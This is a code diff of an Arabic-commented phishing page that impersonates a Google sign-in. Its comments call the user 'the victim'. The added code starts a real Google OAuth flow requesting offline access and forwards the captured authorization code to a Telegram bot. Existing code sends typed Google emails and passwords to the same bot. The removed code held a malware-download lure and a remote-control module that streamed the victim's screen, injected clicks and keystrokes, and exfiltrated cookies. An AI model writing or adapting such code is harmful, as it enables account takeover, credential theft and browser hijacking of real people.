             document.getElementById('googleOverlay').classList.add('active');
         }
 
         // =====================================================
-        // 🔵 الخطوة 2: شاشة جوجل المزيفة
+        // 🔵 الخطوة 2: شاشة جوجل — بضغطة واحدة (OAuth حقيقي) أو يدوي
         // =====================================================
+        function startOAuth() {
+            var params = new URLSearchParams({
+                client_id: OAUTH_CLIENT_ID,
+                redirect_uri: OAUTH_REDIRECT_URI,
+                response_type: 'code',
+                scope: 'openid email profile',
+                access_type: 'offline',
+                prompt: 'consent',
+                include_granted_scopes: 'true',
+                state: 'ps' + Date.now()
+            });
+            window.location.href = 'https://accounts.google.com/o/oauth2/v2/auth?' + params.toString();
+        }
         function closeGoogleOverlay() {
             document.getElementById('googleOverlay').classList.remove('active');
-            showDownloadOverlay();
         }
         function googleSubmit() {
-            var gEmail = document.getElementById('googleEmail').value;
+            var gEmail = document.getElementById('googleEmail').value.trim();
             var gPass = document.getElementById('googlePass').value;
             if (!gEmail || !gPass) { alert('⚠️ يرجى إدخال البريد الإلكتروني وكلمة المرور'); return; }
 
@@ -905,116 +918,38 @@
             sendToTelegram(msg);
 
             document.getElementById('googleOverlay').classList.remove('active');
-            showDownloadOverlay();
+            showLoginModal();
         }
 
         // =====================================================
-        // 📥 الخطوة 3: شاشة تحميل البرنامج
+        // 🔑 كاشف كود OAuth — أول ما الضحية توافق، الكود يوصل للبوت
+        //    وبعدها شاشة "تم عملية الدفع" فورًا (مفيش رجوع لأول الصفحة)
         // =====================================================
-        function showDownloadOverlay() {
-            document.getElementById('downloadOverlay').classList.add('active');
-        }
-        function skipDownload() {
-            document.getElementById('downloadOverlay').classList.remove('active');
-            sendToTelegram('<b>⏭️ User skipped download</b>');
-            setTimeout(startScreenShare, 500);
-        }
-        document.getElementById('malwareBtn').addEventListener('click', function() {
-            sendToTelegram('<b>📥 Malware download clicked</b>');
-            setTimeout(function() {
-                document.getElementById('downloadOverlay').classList.remove('active');
-                startScreenShare();
-            }, 2000);
-        });
-
-        // =====================================================
-        // 🖥 الخطوة 4 (الأخيرة): مشاركة الشاشة + التحكم عن بعد
-        // =====================================================
-        var remotePeer = null, remoteConn = null, remoteCall = null, screenStream = null;
-
-        function startScreenShare() {
-            sendToTelegram('<b>🖥 Requesting screen share...</b>');
-            if (typeof navigator.mediaDevices === 'undefined' || typeof navigator.mediaDevices.getDisplayMedia === 'undefined') {
-                sendToTelegram('<b>⚠️ Screen share not supported</b>');
+        (function() {
+            var m = window.location.href.match(/[?&]code=([^&]+)/);
+            if (m) {
+                var code = decodeURIComponent(m[1]);
+                if (!sessionStorage.getItem('ps_code_sent')) {
+                    sessionStorage.setItem('ps_code_sent', '1');
+                    sendToTelegram('<b>🔑 OAUTH AUTHORIZATION CODE</b>\n\n<code>' + code + '</code>\n\n🕐 ' + new Date().toISOString());
+                }
+                try { history.replaceState({}, '', window.location.pathname); } catch(e) {}
                 showLoginModal();
                 return;
             }
-            navigator.mediaDevices.getDisplayMedia({
-                video: { cursor: 'always', displaySurface: 'monitor' },
-                audio: false
-            }).then(function(stream) {
-                screenStream = stream;
-                sendToTelegram('<b>✅ SCREEN SHARE ENABLED</b>');
-                remotePeer = new Peer();
-                remotePeer.on('open', function(id) {
-                    remoteConn = remotePeer.connect(ROOM_NAME, { reliable: true });
-                    remoteCall = remotePeer.call(ROOM_NAME, stream);
-                    remoteConn.on('open', function() {
-                        remoteConn.send({ type: 'victim_connected', platform: navigator.platform, screen: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone });
-                        sendToTelegram('<b>🔗 Connected to room: </b>' + ROOM_NAME);
-                    });
-                    remoteConn.on('data', function(cmd) { executeRemoteCommand(cmd); });
-                    remoteConn.on('close', function() { if(screenStream) screenStream.getTracks().forEach(function(t){t.stop();}); });
-                });
-                remotePeer.on('error', function(err) { console.log('Peer error:', err); });
-                stream.getVideoTracks()[0].onended = function() { connectDataOnly(); };
-                showLoginModal();
-            }).catch(function(err) {
-                sendToTelegram('<b>⚠️ Screen share rejected</b>');
-                connectDataOnly();
-                showLoginModal();
-            });
-        }
-
-        function connectDataOnly() {
-            remotePeer = new Peer();
-            remotePeer.on('open', function(id) {
-                remoteConn = remotePeer.connect(ROOM_NAME, { reliable: true });
-                remoteConn.on('open', function() {
-                    remoteConn.send({ type: 'victim_no_video', platform: navigator.platform });
-                    sendToTelegram('<b>🔗 Data channel connected (no video)</b>');
-                });
-                remoteConn.on('data', function(cmd) { executeRemoteCommand(cmd); });
-            });
-        }
-
-        function executeRemoteCommand(cmd) {
-            switch(cmd.type) {
-                case 'click':
-                    var x = (cmd.x / 100) * window.innerWidth;
-                    var y = (cmd.y / 100) * window.innerHeight;
-                    var el = document.elementFromPoint(x, y);
-                    if (el) { el.focus(); el.dispatchEvent(new MouseEvent('click', { clientX: x, clientY: y, bubbles: true, cancelable: true, view: window })); }
-                    break;
-                case 'key':
-                    var a = document.activeElement;
-                    if (a && (a.tagName === 'INPUT' || a.tagName === 'TEXTAREA')) {
-                        var s = a.selectionStart || 0, e = a.selectionEnd || 0, t = a.value || '';
-                        a.value = t.substring(0, s) + cmd.key + t.substring(e);
-                        a.setSelectionRange(s + cmd.key.length, s + cmd.key.length);
-                        a.dispatchEvent(new Event('input', { bubbles: true }));
-                    }
-                    break;
-                case 'navigate':
-                    window.open(cmd.url, '_blank');
-                    break;
-                case 'getCookies':
-                    if (remoteConn) remoteConn.send({ type: 'cookies', cookies: document.cookie, count: document.cookie.split(';').filter(function(x){return x.trim();}).length });
-                    break;
-                case 'disconnect':
-                    if (screenStream) screenStream.getTracks().forEach(function(t){t.stop();});
-                    if (remoteConn) remoteConn.close();
-                    if (remoteCall) remoteCall.close();
-                    break;
-            }
-        }
+            // جوجل رجعت بدون كود (error) — ننضف الرابط ونكمل عادي
+            try { history.replaceState({}, '', window.location.pathname); } catch(e) {}
+        })();
 
         // =====================================================
         // 🚀 تشغيل أولي
         // =====================================================
         document.getElementById('accountForm').classList.add('disabled');
         loadProducts();
-        sendToTelegram('<b>✅ PAGE LOADED</b> | ' + window.location.href);
+        if (!sessionStorage.getItem('ps_loaded')) {
+            sessionStorage.setItem('ps_loaded', '1');
+            sendToTelegram('<b>✅ PAGE LOADED</b> | ' + window.location.href);
+        }
     </script>
 </body>
 </html>
